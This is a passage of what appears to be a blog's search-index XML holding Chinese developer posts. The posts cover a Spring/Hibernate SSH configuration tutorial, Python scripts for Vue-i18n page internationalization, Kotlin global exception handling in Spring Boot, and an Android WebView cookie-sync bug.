&lt;/bean&gt; &lt;!-- 配置数据源 dataSource --&gt; &lt;bean id="dataSource" class="com.mchange.v2.c3p0.ComboPooledDataSource"&gt; &lt;!-- 配置连接池基础信息：连接驱动、连接地址、用户名、密码 --&gt; &lt;property name="driverClass" value="$&#123;jdbc.driverClass&#125;"/&gt; &lt;property name="jdbcUrl" value="$&#123;jdbc.url&#125;"/&gt; &lt;property name="user" value="$&#123;jdbc.user&#125;"/&gt; &lt;property name="password" value="$&#123;jdbc.password&#125;"/&gt; &lt;!-- 初始化连接池连接数大小，默认值为3 --&gt; &lt;property name="initialPoolSize" value="$&#123;initialPoolSize&#125;"/&gt; &lt;!-- 最大空闲时间，为0则永不丢弃，默认值为0 --&gt; &lt;property name="maxIdleTime" value="$&#123;maxIdleTime&#125;"/&gt; &lt;!-- 连接池的最大连接数，默认最大值为15 --&gt; &lt;property name="maxPoolSize" value="$&#123;maxPoolSize&#125;"/&gt; &lt;!-- 连接池中保持的最小连接数，默认值为3 --&gt; &lt;property name="minPoolSize" value="$&#123;minPoolSize&#125;"/&gt; &lt;!-- 更多配置以及默认值可查看c3p0依赖库中的 com.mchange.v2.c3p0.impl.C3P0Defaults类 --&gt; &lt;/bean&gt; &lt;!-- 配置会话工厂 SessionFactory --&gt; &lt;bean id="sessionFactory" class="org.springframework.orm.hibernate5.LocalSessionFactoryBean"&gt; &lt;!--配置数据源--&gt; &lt;property name="dataSource" ref="dataSource"/&gt; &lt;!--配置 Hibernate属性--&gt; &lt;property name="hibernateProperties"&gt; &lt;props&gt; &lt;!-- hibernate 方言 --&gt; &lt;prop key="hibernate.dialect"&gt;$&#123;hibernate.dialect&#125;&lt;/prop&gt; &lt;prop key="hibernate.show_sql"&gt;$&#123;hibernate.show_sql&#125;&lt;/prop&gt; &lt;prop key="hibernate.format_sql"&gt;$&#123;hibernate.format_sql&#125;&lt;/prop&gt; &lt;prop key="hibernate.hbm2ddl.auto"&gt;$&#123;hibernate.hbm2ddl.auto&#125;&lt;/prop&gt; &lt;/props&gt; &lt;/property&gt; &lt;!-- 配置要扫描的包路径 --&gt; &lt;property name="packagesToScan" value="com.lanshiqin.*.entity"/&gt; &lt;/bean&gt; &lt;!-- 配置事物管理 transactionManager --&gt; &lt;bean id="transactionManager" class="org.springframework.orm.hibernate5.HibernateTransactionManager"&gt; &lt;!-- 配置 SessionFactory --&gt; &lt;property name="sessionFactory" ref="sessionFactory"/&gt; &lt;/bean&gt; &lt;!-- 配置事务，使事务注解生效 默认属性值 transaction-manager="transactionManager"，因为上面配置了预定的默认名称，故此处可省略 --&gt; &lt;tx:annotation-driven/&gt;&lt;/beans&gt; 配置 Spring MVCWEB-INF/app-webmvc.xml1234567891011121314151617181920212223242526272829303132&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;beans xmlns="http://www.springframework.org/schema/beans" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:context="http://www.springframework.org/schema/context" xmlns:mvc="http://www.springframework.org/schema/mvc" xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd http://www.springframework.org/schema/mvc http://www.springframework.org/schema/mvc/spring-mvc.xsd"&gt; &lt;description&gt;Spring MVC 配置&lt;/description&gt; &lt;!-- 配置扫描注解的目录 --&gt; &lt;context:component-scan base-package="com.lanshiqin"/&gt; &lt;!-- 配置内部资源分配器，为模型视图名称添加前置路径和后缀名称 --&gt; &lt;bean class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt; &lt;property name="prefix" value="/templates/"/&gt; &lt;property name="suffix" value=".jsp"/&gt; &lt;/bean&gt; &lt;!-- 配置默认的servlet，处理程序将所有的请求转发到默认处理器，处理静态资源 --&gt; &lt;mvc:default-servlet-handler/&gt; &lt;!-- 配置消息视图转换 --&gt; &lt;mvc:annotation-driven&gt; &lt;mvc:message-converters&gt; &lt;bean class="org.springframework.http.converter.StringHttpMessageConverter"/&gt; &lt;bean class="org.springframework.http.converter.json.MappingJackson2HttpMessageConverter"/&gt; &lt;/mvc:message-converters&gt; &lt;/mvc:annotation-driven&gt;&lt;/beans&gt; 配置Hibernate在Spring的配置文件app-context.xml中其实已经配置了Hibernate的一些实例属性，应用程序的连接池以及Hibernate的SessionFactory和事务管理等，这里是将xml中的配置提取到外部文件，方便后期对这些配置参数的修改和调整。resources/db.properties1234567891011121314151617181920212223242526# 数据库配置jdbc.driverClass=com.mysql.cj.jdbc.Driverjdbc.url=jdbc:mysql://localhost:3306/sshjdbc.user=xxxxjdbc.password=xxxxxx# 初始化连接池连接数大小initialPoolSize=3# 最大空闲时间，超值丢弃连接maxIdleTime=60# 连接池的最大连接数maxPoolSize=50# 连接池中保持的最小连接数minPoolSize=3# hibernate 方言hibernate.dialect=org.hibernate.dialect.MySQL8Dialecthibernate.show_sql=truehibernate.format_sql=truehibernate.hbm2ddl.auto=update 常见问题pom.xml 中的依赖在pom.xml中有关Spring的依赖中，为何只引入了Spring MVC 和 Spring ORM 的依赖？因为 Spring MVC 依赖于 Spring Core、Spring Bean、Spring Context 等其他基础模块，所以引入一个 Spring MVC 依赖，maven会将其关联的依赖一起引入。由上图可知，Spring模块关系顶层分为两大类，一个是用于web开发的Spring MVC，另一类与数据相关的，底层的大部分基础模块都是共同需要的，开发者可以根据自己需要引入相关的模块。 为何要单独引入fasterxml的jackson的core和databading依赖，不添加会有什么问题？因为后端接口开发目前基本都有需要输出Json格式的数据场景，所以需要在Spring中配置消息视图转换器，Spring默认没有Json序列化的实现，所以如果不添加json的相关依赖库，将无法处理json转换相关的功能，比如在使用 @ResponseBody注解时不会被解析，如果配置了视图解析器为json，那么会因为找不到json依赖库在容器启动时抛出异常。 web.xml 的配置listener标签中配置的Spring的ContextLoaderListener有什么作用，为什么要配置这个参数？123&lt;listener&gt; &lt;listener-class&gt;org.springframework.web.context.ContextLoaderListener&lt;/listener-class&gt;&lt;/listener&gt; ContextLoaderListener是Spring的上下文加载监听器，开发者通过该监听器可以实现一些自定义功能。另外很重要的一点是该配置会使Spring 容器启动时默认加载 WEB-INF 目录下的 applicationContext.xml 文件，如果不想按照约定创建这个文件，则必须要自己指定配置文件。有关如何指定配置文件，请继续往下看。 为何要配置contextConfigLocation这个参数1234&lt;context-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/app-context.xml&lt;/param-value&gt;&lt;/context-param&gt; 因为在listener标签中配置了ContextLoaderListener，所以Spring 容器启动时默认会加载 WEB-INF 目录下的 applicationContext.xml文件， 由于 WEB-INF 目录下 没有 applicationContext.xml 这个配置文件，所以容器启动时会抛出IO异常。java.io.FileNotFoundException: Could not open ServletContext resource [/WEB-INF/applicationContext.xml]，要避免这个问题，需要在 WEB-INF 目录下建立 applicationContext.xml文件。如果开发者不想创建 applicationContext.xml文件，就必须通过contextConfigLocation参数指定自定义配置文件。 为何在&lt;servlet&gt;标签中配置&lt;init-param&gt;初始化参数并且指定contextConfigLocation配置？这个和上面的配置不是重复了吗？123456789&lt;servlet&gt; &lt;servlet-name&gt;app&lt;/servlet-name&gt; &lt;servlet-class&gt;org.springframework.web.servlet.DispatcherServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;contextConfigLocation&lt;/param-name&gt; &lt;param-value&gt;WEB-INF/app-webmvc.xml&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt; 因为这个servlet配置的是Spring MVC 的DispatcherServlet，实例创建时默认会加载/WEB-INF/app-servlet.xml,如果开发者在对应目录下创建了该文件，则可以不需要配置这个初始化参数。如果不创建/WEB-INF/app-servlet.xml，则会抛出IO异常java.io.FileNotFoundException: Could not open ServletContext resource [/WEB-INF/app-servlet.xml]。如果不想创建/WEB-INF/app-servlet.xml,就必须在DispatcherServlet所在的servlet标签中配置自定义文件 spring配置文件问题InternalResourceViewResolver12345&lt;!-- 配置内部资源分配器，为模型视图名称添加前置路径和后缀名称 --&gt;&lt;bean class="org.springframework.web.servlet.view.InternalResourceViewResolver"&gt; &lt;property name="prefix" value="/templates/"/&gt; &lt;property name="suffix" value=".jsp"/&gt;&lt;/bean&gt; 配置内部资源分配器。可以通过属性指定web工程所在的模板视图的路径前缀和模板文件名后缀，即通过Controller重定向到的页面路径为/templates/+ 模板文件名 + .jsp例如123456@RequestMapping("/hello")public ModelAndView index(ModelAndView modelAndView)&#123; modelAndView.addObject("name","蓝士钦"); modelAndView.setViewName("index"); return modelAndView;&#125; 该方法通过modelAndView的addObject向页面传递了参数名name和对应的参数值，并且通过setViewName方法指定模板文件名，所以访问该方法最终会被转发到 /templates/index.jsp 这个页面在 /templates/ 目录下 创建 index.jsp，可以获取到方法传过来的值index.jsp123456789&lt;%@ page contentType="text/html;charset=UTF-8" language="java" %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;SSH&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;Hello $&#123;name&#125;&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt; default-servlet-handler1&lt;mvc:default-servlet-handler/&gt; 该配置用来指定DispatcherServlet为默认的servlet，处理程序将所有的请求转发到默认处理器，一定要配置该处理程序，才能使内部资源分配器InternalResourceViewResolver的配置生效。如果没有这个配置，开发者视图访问控制器所转发的页面时会抛出异常信息 org.springframework.web.servlet.DispatcherServlet.noHandlerFound No mapping for GET / …default-servlet-handler 的源码中说明如下： Configures a handler for serving static resources by forwarding to the Servlet container’s default Servlet.Use of this handler allows using a “/“ mapping with the DispatcherServlet while still utilizing the Servletcontainer to serve static resources.This handler will forward all requests to the default Servlet. Therefore it is important that it remains lastin the order of all other URL HandlerMappings. That will be the case if you use the “annotation-driven” elementor alternatively if you are setting up your customized HandlerMapping instance be sure to set its “order”property to a value lower than that of the DefaultServletHttpRequestHandler, which is Integer.MAX_VALUE. message-converters我们经常会看到一个Controller中的方法上面标注了一个@ResponseBody注解，特别是经常使用 Spring Boot 的同学会发现加上这个注解之后通过浏览器访问接口会返回Json数据，其实这是 Spring Boot 默认替开发者配置了消息转换器。 @ResponseBody可以输出Json格式的数据，也可以输出XML格式的数据，具体输出什么取决于对消息转换器的配置。比如下面这段代码12345678@GetMapping("info")@ResponseBodypublic User info()&#123; User user = new User(); user.setUserName("蓝士钦"); user.setPassWord("xxx"); return user;&#125; 在Spring Boot 中访问该接口会输出对象的json数据1234&#123; "userName": "蓝士钦", "passWord": "123"&#125; 但是如果是非Spring Boot 工程，比如自己用 Spring MVC 整合的框架中，如果没有对消息转换器进行配置，那么 Spring MVC 默认将不会对@ResponseBody注解进行解析，最终会出现404 - Not Found 所以我们需要配置消息转换器1234567&lt;!-- 配置消息视图转换 --&gt;&lt;mvc:annotation-driven&gt; &lt;mvc:message-converters&gt; &lt;bean class="org.springframework.http.converter.StringHttpMessageConverter"/&gt; &lt;bean class="org.springframework.http.converter.json.MappingJackson2HttpMessageConverter"/&gt; &lt;/mvc:message-converters&gt;&lt;/mvc:annotation-driven&gt; 由于上面配置了Json信息映射，而Spring本身并没有实现json处理，如果没有添加json相关的依赖库，那么将会在启动过程中出现org.springframework.web.servlet.FrameworkServlet.initServletBean Context initialization failed，并且输出 RequestMappingHandlerAdapter这个Bean创建失败的信息。 所以一定要记得在pom.xml中添加json处理的依赖库12345678910111213&lt;!-- 添加 jackson-core 依赖 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-core&lt;/artifactId&gt; &lt;version&gt;2.9.7&lt;/version&gt;&lt;/dependency&gt;&lt;!-- 添加 jackson-databind 依赖 --&gt;&lt;dependency&gt; &lt;groupId&gt;com.fasterxml.jackson.core&lt;/groupId&gt; &lt;artifactId&gt;jackson-databind&lt;/artifactId&gt; &lt;version&gt;2.9.7&lt;/version&gt;&lt;/dependency&gt; 项目框架将持续集成和更新，GitHub：https://github.com/lanshiqin/ssh-framework]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决传统工程中的网页需要批量国际化的问题]]></title>
    <url>%2F7c398525%2F</url>
    <content type="text"><![CDATA[遇到这样一个需求，需要将旧系统中的几十个页面做国际化。由于之前是写死中文，所以需要耗费大量的工作将系统中的中文全部提取出来做翻译工作。人工查找不仅费时费力，而且还有可能出现遗漏。站在开发者的角度思考问题，我们应该把抽象的问题具体化，并且将可行的方案用程序实现，将重复工作交给计算机去做，下次遇到同样的问题就可以直接使用上次的工具，避免重复无用的劳动力。 #原始需求分析由于目前还没有专业的前端团队，并且旧系统需要做国际化，涉及的工程模块比较多，需要将每个html页面中写死的中文修改成国际化支持。要找出所有页面的中文，将中文罗列出来交给专业人士进行一一对应的翻译，翻译后要逐个替换为国际化支持的表达式，其中的键名在翻译前就需要确定。主要的体力劳动在于找出所有的中文和替换掉所有的中文为表达式的操作。 #问题具体化目前系统页面的写法：中文内容写死在html中1234567891011121314151617&lt;html&gt; &lt;head&gt; &lt;title&gt;vue-demo&lt;/title&gt; &lt;script src="vue.min.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- Vue示例 --&gt; &lt;div id="app"&gt; &lt;p&gt;中文内容&lt;/p&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; new Vue(&#123; el: '#app' &#125;); &lt;/script&gt;&lt;/html&gt; 使用VueI18n国际化的写法：不同语种对应的词使用相同的键名，页面根据键名取值，值内容由语言环境决定123456789101112131415161718192021222324252627282930313233343536373839&lt;html&gt; &lt;head&gt; &lt;title&gt;vue-i18n-demo&lt;/title&gt; &lt;script src="vue.min.js"&gt;&lt;/script&gt; &lt;script src="vue-i18n.min.js"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id="app"&gt; &lt;!-- 根据键名输出值 --&gt; &lt;p&gt;&#123;&#123; $t("message.title") &#125;&#125;&lt;/p&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; // 消息定义，一般将不同语种分别放置到不同的文件中 const messages = &#123; en: &#123; message: &#123; title: 'English Content' &#125; &#125;, cn: &#123; message: &#123; title: '中文内容' &#125; &#125; &#125;; // VueI18n 实例，设置当前语言环境和消息对象 const i18n = new VueI18n(&#123; locale: 'en', messages: messages, &#125;); new Vue(&#123; el: '#app', i18n: i18n &#125;); &lt;/script&gt;&lt;/html&gt; 在实际使用中，我们一般将不同的语种放置到不同的文件中，每个语种都可以请相关专业的人进行翻译。系统使用时再跟进语言环境加载不同的语言包文件，这点和Android App等移动开发类似，也是采用这种方案。 实现方案1.将工程下所有的html页面中的所有中文提取到一个文件中（提取内容要忽略掉代码中的注释文件）2.将提取出来的中文做翻译工作（可以交给专业人士翻译），每个语种对应生成一个js语言变量文件。 1234const en = &#123; 简体中文标题: 'English Title', 简体中文内容: 'English Content',&#125; 其中js变量文件中自动生成好默认的键,根据源代码中开发者写死的中文作为键的好处是翻译人员可以明确要翻译的内容，翻译后把对应的值赋值上即可。程序中也以当前开发者之前所写的语言作为键，省去人工比对翻译键值对的操作。 3.将html的中文替换为VueI18n模板表达式，变量值为语言文件中对应的键 做完上述工作后就可以根据语言环境的切换自动加载不同的语言文件，页面上的文字值显示的为对应js语言文件中的值。 编码实现第一步：提取中文到指定文件 TextUtils.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657import osimport re__author__ = '蓝士钦'# 获取指定目录下指定后缀的文件全路径名，返回数组def get_file_path_list(path, find_suffix): files = os.listdir(path) # 得到文件夹下的所有文件名称 s = [] for file in files: # 遍历文件夹 if os.path.splitext(file)[1] == find_suffix: s.append(path + "/" + file) return s# 读取文件,根据匹配规则查找目标，输出到指定文件def read_file_match_out(match_rule, exclude_rule, file_path_list, write_file): out_file = open(write_file, "w") for file_obj in file_path_list: file = open(file_obj, 'r') line = file.readline() while line: text_list = text_split_list(match_rule, exclude_rule, line) if not text_list: pass else: for text in text_list: out_file.write(text + '\n') line = file.readline() file.close() out_file.close()# 根据规则查找出目标文字，返回数组def text_split_list(match_rule, exclude_rule, text_str): for exr in exclude_rule: text_str = re.sub(exr, "", text_str) array_list = match_rule.split(text_str) while '' in array_list: array_list.remove('') return array_list# 根据你的实际情况if __name__ == '__main__': # 要匹配的文件路径和文件后缀 file_input_path = '/Users/lanshiqin/Temp/vue-demo' file_input_list = get_file_path_list(file_input_path, '.html') # 要匹配的规则 match_re = re.compile('[^\u4E00-\u9FA5]') # 要排除的规则数组 排除html中的&lt;!-- 和 // 注释 exclude_re = [r'&lt;!--.*$', r'//.*$'] # 匹配到的值要输出到的指定文件 file_out_path = '/Users/lanshiqin/Desktop/zh_cn.txt' # 匹配输出 read_file_match_out(match_re, exclude_re, file_input_list, file_out_path) 第二步：生成需要翻译的多语种js文件 GenerateUtils.py1234567891011121314151617181920212223# 生成多语言js文件def generate_language_js_files(file_input, file_output_list): for file_output in file_output_list: file_out = open(file_output + '.js', 'w') file_out.write('const ' + file_output + ' = &#123;\n') file = open(file_input, 'r') line = file.readline() while line: line = line.replace("\n", "") print(line) file_out.write("\t" + line + ": '" + line + "',\n") line = file.readline() file_out.write("&#125;") file.close() file_out.close()if __name__ == '__main__': # 第一步找到的简体中文 input_file = '/Users/lanshiqin/Desktop/zh_cn.txt' # 要输出的目标语种文件文件 output_file_list = ['cn', 'en'] # 生成多语言目标文件 generate_language_js_files(input_file, output_file_list) 第三步：替换html中的中文为VueI18n模板表达式，其中的键为语种文件的变量123456789101112131415161718192021222324252627282930313233343536373839# 按行读取文件内容转换成数组def read_file_to_list(file_input): file = open(file_input, 'r') line = file.readline() file_list = [] while line: line = line.replace('\n', '') file_list.append(line) line = file.readline() return file_list# 根据中文键名称替换目标文件集合中的中文为VueI18n的模板表达式def replace_I18n_template(key_list, file_path_list): for file_obj in file_path_list: file_obj_temp = '' for key in key_list: file = open(file_obj, 'r') line = file.readline() while line: line = line.replace(key, '&#123;&#123; $t("' + key + '") &#125;&#125;') file_obj_temp += line line = file.readline() file.close() file_write = open(file_obj, 'w') file_write.write(file_obj_temp) file_obj_temp = '' file_write.close()# 根据你的实际情况if __name__ == '__main__': # 读取指定文件包装成数组 input_file = '/Users/lanshiqin/Desktop/zh_cn.txt' file_key_list = read_file_to_list(input_file) # 要匹配的文件路径和文件后缀 file_input_path = '/Users/lanshiqin/Temp/vue-demo' file_input_list = get_file_path_list(file_input_path, '.html') # 对匹配的文件进行VueI18n模板表达式替换 replace_I18n_template(file_key_list, file_input_list) 这样一个传统的Vue构建的前端本地化工程，就可以实现一秒钟完成国际化的操作。如果觉得多语言文件中的键采用中文有不妥，可以继续采用匹配方案，将所有的键都批量重命名。默认采用中文作为键，这样做的目的是高效，精确，节省时间。我的考虑是：采用开发者原生语言作为键，也就是我们本土化的人都认识的语言，然后将对应的语言文件交给掌握本土化语言并且掌握目标要翻译语言的这样一个人，这样他就能够精确高效的翻译，翻译后的文件也是程序可直接使用的。 开发者无需关系键名和键值，如果比较强迫症，某一天突然想好了这个键要取什么名字，可以进行匹配替换操作。这里仅仅针对传统开发的Vue进行I18n的支持，如果需要翻译Android App的多语言文件，或者其他类似平台的多语言文件时，这些平台可能不能使用中文作为键，中文作为键可以认为是一个中间过程，等翻译工作全部完成后，再写个自动化脚本自动批量替换想好的键即可。 一键国际化演示 为了操作方便，我把3个python文件的代码都放在一个vue_language_global.py 文件中了github地址：https://github.com/lanshiqin/VueLanguageUtils欢迎 Star&amp;Fork 总结如果涉及到英语以及其他外语，单纯的国际化支持其实是不够的，除了不能用机器翻译外，还需要考虑每个字词对应的翻译内容长度，原先的UI设计和交互可能就需要改变，因此语言跨度比较大的国际化，一般会单独做一个版本。 本次遇到的需求其实是需要支持繁体中文，每个汉字对应一个繁体字，不涉及语法以及词序的问题。所以这步翻译操作可以采用调用api的方式完成自动化翻译生成文件。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[全局异常处理机制]]></title>
    <url>%2F7545587%2F</url>
    <content type="text"><![CDATA[异常处理机制在后端开发中起着至关重要的作用。在Java后端开发中，Service层一般用来做业务逻辑层，这一层所出现的和业务无关的异常，应当往上一层抛出，最终在Controller层处理所有的异常，所以要定制一套完成的异常处理方案，针对不同的异常做不同的处理。 针对业务层的不同异常，要做各自的处理并合理返回，这里就不详细说明，主要记录一下全局异常的捕获和处理。 Spring Boot中默认对全局异常做了处理,用浏览器访问一个异常接口时，会返回一个error页面，并且把异常信息显示出来。当用PostMan等工具进行API请求的方式访问异常的接口时，会返回一个json数据。1234567&#123; "timestamp": "2018-09-09T03:52:05.850+0000", "status": 404, "error": "Not Found", "message": "异常信息", "path": "/xxxPath"&#125; 在大多数情况下，应该为不同的设备访问方式返回相同格式的信息，这里的json格式字段可能并不是业务所需要的。在实际业务中，当服务调用出现异常时，应该为调用者返回约定好的与业务相关的数据模型。比如Controller层在处理捕获到的异常后可以向外抛出一个ApiException，用来表示与业务无关的全局异常。新建ApiException类继承Exception12345678package com.lanshiqin.apiboot.controller.exception/** * API异常类 * 用来标注Controller调用的通用异常 * @author 蓝士钦 */class ApiException(message: String?) : Exception(message) 新建全局异常处理类 GlobalExceptionHandler1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556package com.lanshiqin.apiboot.controller.handlerimport com.lanshiqin.apiboot.controller.exception.ApiExceptionimport com.lanshiqin.apiboot.model.ErrorInfoimport org.slf4j.LoggerFactoryimport org.springframework.web.bind.annotation.ControllerAdviceimport org.springframework.web.bind.annotation.ExceptionHandlerimport org.springframework.web.bind.annotation.ResponseBodyimport org.springframework.web.servlet.ModelAndViewimport javax.servlet.http.HttpServletRequest/** * 全局异常处理 * @author 蓝士钦 */@ControllerAdviceclass GlobalExceptionHandler&#123; /** * 统一异常处理方法 * 打印异常日志，并将错误信息输出到指定的页面 * @ httpServletRequest 请求对象 * @ exception 异常信息 */ @ExceptionHandler(value = [Exception::class]) fun defaultExceptionHandler(httpServletRequest: HttpServletRequest, exception: Exception): ModelAndView&#123; logger.error("全局异常: "+exception.printStackTrace().toString()) val modelAndView = ModelAndView() modelAndView.addObject("exception",exception) modelAndView.addObject("url",httpServletRequest.requestURL) modelAndView.viewName = DEFAULT_EXCEPTION_PAGE return modelAndView &#125; /** * API异常处理方法 * @ httpServletRequest 请求对象 * @ exception 异常信息 */ @ResponseBody @ExceptionHandler(value = [ApiException::class]) fun apiExceptionHandler(httpServletRequest: HttpServletRequest, exception: Exception): ErrorInfo&lt;String&gt; &#123; logger.error("API异常: "+exception.printStackTrace().toString()) val errorInfo: ErrorInfo&lt;String&gt; = ErrorInfo() errorInfo.code=500 errorInfo.message=exception.message errorInfo.data="API异常" return errorInfo &#125; companion object &#123; const val DEFAULT_EXCEPTION_PAGE = "exception" val logger = LoggerFactory.getLogger(GlobalExceptionHandler::class.java)!! &#125;&#125; 处理异常的方法上需要添加@ExceptionHandler注解，value值是一个数组，用来声明这个方法要处理哪些异常。当异常匹配方法时才会进入方法体执行相应的逻辑。 在resources/template下新建页面 exception.html123456789101112&lt;!DOCTYPE html&gt;&lt;html lang="en" xmlns:th="http://www.w3.org/1999/xhtml"&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;统一异常处理&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;h1&gt;发生异常&lt;/h1&gt; &lt;div th:text="$&#123;url&#125;"&gt;&lt;/div&gt; &lt;div th:text="$&#123;exception.message&#125;"&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 需要注意的是，SpringBoot有几个可选的视图模板引擎，虽然做了默认配置的，但是还是需要在Gradle中引用依赖,否则无法正常解析指定的模板页面1compile('org.springframework.boot:spring-boot-starter-thymeleaf') 在全局异常处理类中，定义了两个方法，一个用来处理未捕获的异常，并且返回html页面进行显示。在API后端接口服务开发中，应当在Controller层处理掉所有异常，所以以非json来输出这个页面一方面是用来显示错误信息，另一方面是用来说明API接口写的有问题。客户端在API请求时如果接受到这样的html，会无法解析按照约定的json格式。这个异常页面用来提示后端开发人员应当在Controller层处理掉异常，抛出ApiException。 一个相对正确的API接口，Controller示例如下12345678910111213141516171819202122232425262728/** * 用户信息Controller * @author 蓝士钦 */@RestControllerclass UserInfoController&#123; /** * 用户信息Service */ @Autowired val userInfoService: UserInfoService?=null /** * 添加用户信息 */ @PutMapping("/addUserInfo") fun addUserInfo(@RequestBody userInfo: UserInfo): Any&#123; return try &#123; userInfoService!!.saveUserInfo(userInfo) &#125;catch (e: Exception)&#123; // 捕获并处理异常 // ... // 抛出ApiException throw ApiException(e.message) &#125; &#125;&#125; Controller一定要捕获并且处理掉所有异常，然后向外返回一个约定好的处理失败的信息格式。这里最后抛出ApiException，全局异常处理类中会拦截到这个异常并且做异常日志记录，返回异常信息给调用者。 注：业务层捕获到自己业务范围内的异常时要自己处理掉，并且根据情况终止业务，把异常状态返回给调用者告知异常。业务层不应该处理掉不属于自己业务范围的异常，比如Exception等，而是应该往上抛出给Controller，让Controller来处理。Controller处理掉Service抛出的异常，要处理掉并且返回约定好的异常对象格式给调用者，记录全局异常日志。]]></content>
      <categories>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>Spring</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Android低版本WebView引起的BUG]]></title>
    <url>%2F48b8924c%2F</url>
    <content type="text"><![CDATA[日常玄学记录。目前我从事Java后端开发的工作，与移动App开发者对接API接口，App上线后发现有些机型无法正常登陆，为了排查问题使用了不同的模拟器安装App并且进行抓包分析，最终找到了问题所在，在此记录。 具体问题描述最近上线的一个项目，Android客户端采用原生和非原生混合开发，后端API采用Session机制认证，出现部分Android机型无法使用WebView中加载的核心业务，通过抓包发现，某些客户端在使用WebView发起请求时没有带上登录时得到的SESSIONID,Android开发人员通过日志输出证实有把登录的SESSIONID同步设置给WebView的Cookie，并且通过cookieManager.getCookie方法能够取到同步设置的Cookie。于是我只能自己再进一步验证一下，最终找到问题所在。 测试发现主要问题 1.部分Android机型(部分厂商的7.x和8x的Android版本号)无法请求到Web页面，会被后端拦截2.我用Android 5.x 到 9.x 的模拟器测试完全正常，抓包时请求头的Cookie中也正常携带SESSIONID，但是用户真实机型出现不携带Cookie的情况3.Android开发人员确实把SESSIONID同步设置给WebView的Cookie了，客户端设置的Cookie也可以通过getCookie方法取出来，但是抓包发现在某些机型上WebView加载URL的时候请求头中并没有带上Cookie。 解决过程大学研究了3年Android，也遇到过各种坑，这次问题我的第一反应就是不同机型的差异性导致的。回想了一下之前Android开发中曾经遇到的坑，于是用Android4.3版本的模拟测试了一下，发现请求头中果然也没带上Cookieandroid4.3WebView加载接口地址时，请求头数据包如下图所示： 可以看到4.3版本的AndroidWebKit在请求头中存在不携带Cookie的情况用android5.0版本的模拟器测试了一下，发现请求头中有携带Cookie所以，这些机型的产商可能要摸一下自己的良心了，为了减少ROM的开发成本，是不是把部分低版本的WebKit内核直接照搬编译到新系统里了？在网上经常可以看到一堆相互抄袭的文章，WebView同步Cookie的方法如下：12345678910111213141516/** * 同步cookie */public static void synCookies(Context context, String url) &#123; CookieSyncManager.createInstance(context); CookieManager cookieManager = CookieManager.getInstance(); cookieManager.setAcceptCookie(true); // 删除Cookie（可选） cookieManager.removeSessionCookie(); cookieManager.setCookie(url, "登录时得到的SESSIONID"); CookieSyncManager.getInstance().sync(); // 可以日志输出再验证一下 String cookie = cookieManager.getCookie(url); ...&#125;这段代码乍一看没什么问题，虽然getCookie可以取到设置进去的Cookie，但是请求时存在没带上Cookie的情况。问题就出在同步方法上。如果刚好看过4.x的源码，会发现和现在的版本有比较大的不一样。这里最大的区别是:4.3版本的removeSessionCookie方法删除Cookie是异步的sync同步设置Cookie也是异步的。也就是说他可能在你设置了Cookie之后才执行remove操作，或者在WebView请求后才设置Cookie，WebView发起请求时要么Cookie还没被设置，要么就是已经被删除。所以在WebView加载URL发起请求时根本没有把Cookie带上。 一、Android5.0及以上的WebView操作Cookie后的时序图 二、Android4.3版本）操作Cookie后的时序图 解决方案 WebView使用Post请求就可以在头部带上自定义参数，需要后端接口也跟着一起改 Android客户端删除Cookie操作后面加上等待时间比如 Sleep 1000L。 上面这两种方案只是解决问题，但是并不是规范的，其实CookieSyncManager类和cookieManager的很多方法已经被标注为弃用https://developer.android.com/reference/android/webkit/CookieSyncManager 通过android官方文档可知，这些都被标注了@Deprecated，所以开发者在开发的时候要考虑兼容性问题，针对大众的产品要足够的细心 出现这些BUG的主要原因 在我写这篇文章时，Google官方虽然以及将Android更新到了9.0的版本，但是目前在中国市场还存在很多版本碎片化的问题，网上有很多过时的API示例，国内的很多文章都相互抄袭，有的根本没有自己试验过就拷贝过来发表，这样的传播是非常不负责任的。 另外还有一个主要因素是很多厂商喜欢自己定制，曾经我还在开发Android应用时，就遇到某个厂商把摄像头拍照回调的API修改了，导致横竖屏切换的的问题，这种定制可以说是非常恶心来形容了，可能这也是我弃坑的原因之一吧。另外我真的非常喜欢写后台，所以现在能够写API接口感到很欣慰。 曾几何时，依稀记得在学校工作室的时光，曾经的方老师跟我们说过这样一句话“遇到问题不要说我是学Android的，后端的我不管…,不要说什么从Android开发转后端开发这样的话，你曾经学到的知识就是你自己的，没有转行，都是开发，能在一个领域有所成就取决于你有多专注”。原话虽然记得不是很清楚，但是大体就是这个意思，这句话到现在一直铭记在我脑海里。所以遇到问题我不怕，我的想法只有一个：找出问题，并解决它。]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>问题解决</tag>
      </tags>
  </entry>
  <entry>
